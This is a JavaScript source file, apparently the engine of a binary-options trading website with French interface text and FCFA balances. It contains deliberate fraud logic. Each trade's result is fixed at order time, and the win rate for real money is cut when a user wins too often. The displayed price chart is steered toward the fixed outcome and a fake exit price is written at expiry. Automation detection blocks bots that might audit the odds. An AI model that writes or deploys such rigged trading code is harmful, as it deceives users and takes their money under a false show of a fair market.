(function (D6) {
  'use strict';

  var C = D6.CONFIG;
  var markets = {};
  var trades = [];
  var intents = {};
  var payoutLive = {};
  var lastOrderAt = 0;
  var sessionNonce = D6.uid();
  var orderSeq = 0;
  var MAX_OPEN = 5;

  function seedMarket(assetId) {
    var asset = C.ASSETS[assetId];
    var price = asset.basePrice;
    var history = [];
    var candles = [];
    var candle = { o: price, h: price, l: price, c: price };
    var ticks = 0;
    var i;
    for (i = 0; i < 220; i++) {
      var shock = (Math.random() - 0.48) * asset.tickNoise * 0.9;
      price = Math.max(asset.basePrice * 0.85, price + shock + (asset.basePrice - price) * 0.012);
      history.push(price);
      if (i === 0) candle = { o: price, h: price, l: price, c: price };
      candle.h = Math.max(candle.h, price);
      candle.l = Math.min(candle.l, price);
      candle.c = price;
      ticks++;
      if (ticks >= asset.ticksPerCandle) {
        candles.push({ o: candle.o, h: candle.h, l: candle.l, c: candle.c, t: Date.now() - (220 - i) * asset.tickMs });
        candle = { o: price, h: price, l: price, c: price };
        ticks = 0;
      }
    }
    if (ticks > 0) candles.push(candle);
    return {
      id: assetId,
      price: price,
      history: history,
      candles: candles,
      candle: candle,
      ticksInCandle: ticks,
      payout: C.REAL_PAYOUT
    };
  }

  function rollPayout(asset, mode) {
    if (mode === 'real') return C.REAL_PAYOUT;
    var span = asset.payoutMax - asset.payoutMin;
    return +(asset.payoutMin + Math.random() * span).toFixed(3);
  }

  function ensureMarkets() {
    var id;
    for (id in C.ASSETS) {
      if (!markets[id]) markets[id] = seedMarket(id);
    }
  }

  function makeSeal(payload) {
    var s = sessionNonce + '|' + payload + '|' + orderSeq;
    var h = 2166136261;
    var i;
    for (i = 0; i < s.length; i++) {
      h ^= s.charCodeAt(i);
      h = Math.imul(h, 16777619);
    }
    return (h >>> 0).toString(16);
  }

  function automationDetected() {
    if (navigator.webdriver) return true;
    if (window.callPhantom || window._phantom) return true;
    if (window.domAutomation || window.domAutomationController) return true;
    return false;
  }

  function decideOutcome(user) {
    var p = user.mode === 'real' ? C.REAL_WIN_RATE : C.DEMO_WIN_RATE;
    if (user.mode === 'real') {
      var wr = recentWinRate(user, 20);
      if ((user.realTrades || 0) >= 8 && wr > 0.48) p = 0.32;
      if (user.consecutiveLosses >= 4) p = Math.min(0.50, p + 0.04);
    }
    return Math.random() < p ? 'win' : 'lose';
  }

  function recentWinRate(user, n) {
    var list = (user.recentResults || []).filter(function (r) {
      return !r.mode || r.mode === user.mode;
    });
    var slice = list.slice(0, n);
    if (!slice.length) return user.mode === 'real' ? C.REAL_WIN_RATE : C.DEMO_WIN_RATE;
    var wins = 0;
    var i;
    for (i = 0; i < slice.length; i++) if (slice[i] === true || slice[i] === 1 || (slice[i] && slice[i].won)) wins++;
    return wins / slice.length;
  }

  function stakeCap(user, stake) {
    var balance = D6.Store.balanceOf(user);
    if (stake < C.MIN_STAKE) {
      return { ok: false, cap: C.MIN_STAKE, reason: D6.I18N.t('minStake') + ' ' + D6.fmtFCFA(C.MIN_STAKE) };
    }
    if (stake > balance) {
      return { ok: false, cap: balance, reason: D6.I18N.t('insufficient') };
    }
    return { ok: true, cap: balance };
  }

  function gauss() {
    var u = 0;
    var v = 0;
    while (u === 0) u = Math.random();
    while (v === 0) v = Math.random();
    return Math.sqrt(-2 * Math.log(u)) * Math.cos(2 * Math.PI * v);
  }

  function applyTick(market, asset, activeTrade) {
    var vol = Math.max(0.04, asset.tickNoise);
    var mom = market.mom || 0;
    mom = mom * 0.88 + gauss() * vol * 0.38;
    market.mom = mom;
    var reversion = (asset.basePrice - market.price) * 0.00035;
    var shock = mom + reversion + gauss() * vol * 0.55;

    if (activeTrade && intents[activeTrade.id] && activeTrade.assetId === market.id) {
      var progress = 1 - (activeTrade.timeLeft / Math.max(0.01, activeTrade.duration));
      var shouldWin = intents[activeTrade.id].target === 'win';
      var isCall = activeTrade.side === 'call';
      var dir = (isCall && shouldWin) || (!isCall && !shouldWin) ? 1 : -1;
      var targetGap = Math.max(vol * 1.6, 0.08);
      if (progress < 0.5) {
        if (Math.random() < 0.2) shock -= dir * vol * 0.45;
      } else if (progress < 0.78) {
        shock += dir * vol * 0.22;
      } else {
        var targetPx = activeTrade.entryPrice + dir * targetGap;
        shock += (targetPx - market.price) * 0.16 + gauss() * vol * 0.12;
      }
    }

    var prev = market.price;
    var next = Math.max(asset.basePrice * 0.55, prev + shock);
    var wick = Math.abs(gauss()) * vol * 0.85;
    var hi = Math.max(prev, next) + (Math.random() < 0.42 ? wick : wick * 0.12);
    var lo = Math.min(prev, next) - (Math.random() < 0.42 ? wick : wick * 0.12);
    market.price = next;
    market.history.push(next);
    if (market.history.length > 480) market.history.shift();

    var c = market.candle;
    c.h = Math.max(c.h, hi, next);
    c.l = Math.min(c.l, lo, next);
    c.c = next;
    market.ticksInCandle++;
    if (market.ticksInCandle >= asset.ticksPerCandle) {
      market.candles.push({ o: c.o, h: c.h, l: c.l, c: c.c, t: Date.now() });
      if (market.candles.length > 90) market.candles.shift();
      market.candle = { o: next, h: next, l: next, c: next };
      market.ticksInCandle = 0;
    }
  }

  function expiryOf(t) {
    return t.expiryTime || t.expiresAt;
  }

  function isLive(t) {
    return t && !t.settled && Date.now() < expiryOf(t);
  }

  function isOpen(t) {
    return t && !t.settled;
  }

  function syncTime(t) {
    var left = (expiryOf(t) - Date.now()) / 1000;
    t.timeLeft = left > 0 ? left : 0;
    return t.timeLeft;
  }

  function soonestTrade() {
    var live = trades.filter(isLive);
    if (!live.length) return null;
    var best = live[0];
    var i;
    for (i = 1; i < live.length; i++) {
      if (expiryOf(live[i]) < expiryOf(best)) best = live[i];
    }
    return best;
  }

  function publicTrade(t) {
    if (!t) return null;
    syncTime(t);
    return Object.freeze({
      id: t.id,
      assetId: t.assetId,
      side: t.side,
      stake: t.stake,
      duration: t.duration,
      timeLeft: t.timeLeft,
      entryPrice: t.entryPrice,
      payout: t.payout,
      startedAt: t.startedAt,
      startTime: t.startTime || t.startedAt,
      expiryTime: expiryOf(t),
      expiresAt: expiryOf(t),
      settled: !!t.settled,
      mode: t.mode
    });
  }

  ensureMarkets();
  Object.keys(C.ASSETS).forEach(function (id) {
    payoutLive[id] = markets[id].payout;
  });

  var api = {
    markets: markets,
    payoutLive: payoutLive,
    onExpire: null,
    onSettled: null,

    getMarket: function (id) {
      ensureMarkets();
      return markets[id];
    },

    getTrade: function () {
      var live = trades.filter(isLive);
      if (!live.length) return null;
      var best = live[0];
      var i;
      for (i = 1; i < live.length; i++) {
        if (expiryOf(live[i]) < expiryOf(best)) best = live[i];
      }
      return publicTrade(best);
    },

    getTrades: function () {
      return trades.filter(isLive).map(function (t) { return publicTrade(t); });
    },

    liveCount: function () {
      return trades.filter(isOpen).length;
    },

    refreshPayout: function (assetId, mode) {
      var asset = C.ASSETS[assetId];
      var u = D6.Store.current();
      var m = mode || (u && u.mode) || 'demo';
      payoutLive[assetId] = rollPayout(asset, m);
      markets[assetId].payout = payoutLive[assetId];
      return payoutLive[assetId];
    },

    tick: function (assetId) {
      ensureMarkets();
      var market = markets[assetId];
      var asset = C.ASSETS[assetId];
      if (!market || !asset) return;
      var now = Date.now();
      var i;
      for (i = 0; i < trades.length; i++) {
        syncTime(trades[i]);
      }
      var steer = soonestTrade();
      if (steer && steer.settled) steer = null;
      applyTick(market, asset, steer && !steer.settled && steer.assetId === market.id ? steer : null);
    },

    placeOrder: function (user, opts) {
      if (automationDetected()) return { ok: false, reason: 'Session non sécurisée' };
      if (!user || !D6.Store.current() || D6.Store.current().id !== user.id) {
        return { ok: false, reason: 'Session invalide' };
      }
      if (trades.filter(isOpen).length >= MAX_OPEN) {
        return { ok: false, reason: D6.I18N.t('maxPositions') };
      }

      var nowPerf = performance.now();
      if (nowPerf - lastOrderAt < C.MIN_ORDER_MS) {
        return { ok: false, reason: D6.I18N.t('antibot') };
      }

      var stake = Math.floor(Number(opts.stake) || 0);
      var duration = C.DURATIONS.indexOf(opts.duration) >= 0 ? opts.duration : C.DEFAULT_DURATION;
      var assetId = C.ASSETS[opts.assetId] ? opts.assetId : 'v100';
      var side = opts.side === 'put' ? 'put' : 'call';
      var gate = stakeCap(user, stake);
      if (!gate.ok) return gate;

      var market = markets[assetId];
      var payout = user.mode === 'real' ? C.REAL_PAYOUT : (payoutLive[assetId] || rollPayout(C.ASSETS[assetId], 'demo'));
      D6.Store.setBalance(user, D6.Store.balanceOf(user) - stake);
      D6.Store.addTransaction(user, {
        type: 'stake',
        amount: -stake,
        note: (side === 'call' ? 'CALL' : 'PUT') + ' ' + C.ASSETS[assetId].short
      });

      orderSeq += 1;
      lastOrderAt = nowPerf;
      D6.holdRemote = true;
      var target = decideOutcome(user);
      var entry = market.price;
      var wall = Date.now();
      var durationMs = duration * 1000;
      var seal = makeSeal(user.id + '|' + side + '|' + stake + '|' + entry.toFixed(4) + '|' + duration + '|' + orderSeq);
      var id = D6.uid();

      var t = {
        id: id,
        assetId: assetId,
        side: side,
        stake: stake,
        duration: duration,
        durationMs: durationMs,
        timeLeft: duration,
        entryPrice: entry,
        payout: payout,
        startTime: wall,
        startedAt: wall,
        expiryTime: wall + durationMs,
        expiresAt: wall + durationMs,
        mode: user.mode,
        userId: user.id,
        seq: orderSeq,
        settled: false
      };
      trades.push(t);
      intents[id] = { target: target, seal: seal, userId: user.id, seq: orderSeq };

      if (user.mode === 'real') {
        user.realStakeVolume = (user.realStakeVolume || 0) + stake;
      }
      user.lastStake = stake;
      D6.Store.saveUser(user);
      return { ok: true, trade: publicTrade(t) };
    },

    resolve: function (user, tradeId) {
      if (!user || !trades.length) return null;
      var idx = -1;
      var i;
      var now = Date.now();
      if (tradeId) {
        for (i = 0; i < trades.length; i++) {
          if (trades[i].id === tradeId) { idx = i; break; }
        }
      } else {
        for (i = 0; i < trades.length; i++) {
          if (!trades[i].settled && now >= expiryOf(trades[i])) { idx = i; break; }
        }
      }
      if (idx < 0) return null;
      var trade = trades[idx];
      if (trade.settled) return null;
      if (now < expiryOf(trade)) return null;
      trade.settled = true;

      var intent = intents[trade.id];
      if (user.id !== trade.userId) {
        trades.splice(idx, 1);
        delete intents[trade.id];
        return null;
      }

      var shouldWin = !!(intent && intent.target === 'win');
      if (intent) {
        var expectedSeal = makeSeal(user.id + '|' + trade.side + '|' + trade.stake + '|' + trade.entryPrice.toFixed(4) + '|' + trade.duration + '|' + trade.seq);
        if (expectedSeal !== intent.seal || intent.seq !== trade.seq) {
          shouldWin = false;
        }
      } else {
        shouldWin = false;
      }

      var market = markets[trade.assetId];
      var asset = C.ASSETS[trade.assetId];
      var isCall = trade.side === 'call';
      var exitPrice;

      if (shouldWin) {
        var winDelta = Math.max(asset.tickNoise * 0.55, 0.28);
        exitPrice = trade.entryPrice + (isCall ? 1 : -1) * winDelta;
      } else {
        var miss = 0.035 + Math.random() * Math.max(0.08, asset.tickNoise * 0.07);
        exitPrice = trade.entryPrice + (isCall ? -1 : 1) * miss;
      }

      if (market) {
        market.price = exitPrice;
        if (market.candle) {
          market.candle.c = exitPrice;
          market.candle.h = Math.max(market.candle.h, exitPrice);
          market.candle.l = Math.min(market.candle.l, exitPrice);
        }
        if (market.history.length) market.history[market.history.length - 1] = exitPrice;
      }

      var won = shouldWin;
      var payoutAmount = 0;
      var net;

      if (won) {
        payoutAmount = Math.floor(trade.stake * trade.payout);
        D6.Store.setBalance(user, D6.Store.balanceOf(user) + payoutAmount);
        net = payoutAmount - trade.stake;
        user.wins = (user.wins || 0) + 1;
        user.consecutiveWins = (user.consecutiveWins || 0) + 1;
        user.consecutiveLosses = 0;
        user.lastLost = false;
        D6.Store.addTransaction(user, {
          type: 'win',
          amount: payoutAmount,
          note: 'Position gagnante ' + C.ASSETS[trade.assetId].short
        });
      } else {
        net = -trade.stake;
        user.consecutiveLosses = (user.consecutiveLosses || 0) + 1;
        user.consecutiveWins = 0;
        user.lastLost = true;
        D6.Store.addTransaction(user, {
          type: 'loss',
          amount: -trade.stake,
          note: 'Position expirée ' + C.ASSETS[trade.assetId].short
        });
      }

      user.trades = (user.trades || 0) + 1;
      if (trade.mode === 'real') user.realTrades = (user.realTrades || 0) + 1;
      else user.demoTrades = (user.demoTrades || 0) + 1;
      user.recentResults.unshift({ won: won, mode: trade.mode });
      if (user.recentResults.length > 30) user.recentResults.length = 30;

      var position = {
        id: trade.id,
        at: D6.nowIso(),
        clock: D6.clock(),
        assetId: trade.assetId,
        assetName: C.ASSETS[trade.assetId].short,
        side: trade.side,
        stake: trade.stake,
        payout: trade.payout,
        entryPrice: trade.entryPrice,
        exitPrice: exitPrice,
        duration: trade.duration,
        won: won,
        net: net,
        mode: trade.mode
      };
      D6.Store.addPosition(user, position);
      D6.Store.saveUser(user);

      var closed = publicTrade(trade);
      trades.splice(idx, 1);
      delete intents[trade.id];
      if (!trades.filter(isLive).length) D6.holdRemote = false;
      return { trade: closed, position: position, won: won, net: net, exitPrice: exitPrice };
    },

    flushSettlements: function (user) {
      if (!user || !trades.length) return [];
      var now = Date.now();
      var ids = [];
      var i;
      for (i = 0; i < trades.length; i++) {
        if (!trades[i].settled && now >= expiryOf(trades[i])) ids.push(trades[i].id);
      }
      var results = [];
      for (i = 0; i < ids.length; i++) {
        var res = api.resolve(user, ids[i]);
        if (res) {
          results.push(res);
          if (typeof api.onSettled === 'function') {
            try { api.onSettled(res); } catch (e) { /* isolate HUD */ }
          }
        }
      }
      return results;
    },

    maxStakeHint: function (user) {
      var probe = stakeCap(user, Number.MAX_SAFE_INTEGER);
      return probe.cap;
    }
  };

  D6.Engine = api;
  try {
    Object.defineProperty(D6, 'Engine', { configurable: false, writable: false, value: api });
  } catch (e) { /* ignore */ }
})(window.D6 = window.D6 || {});
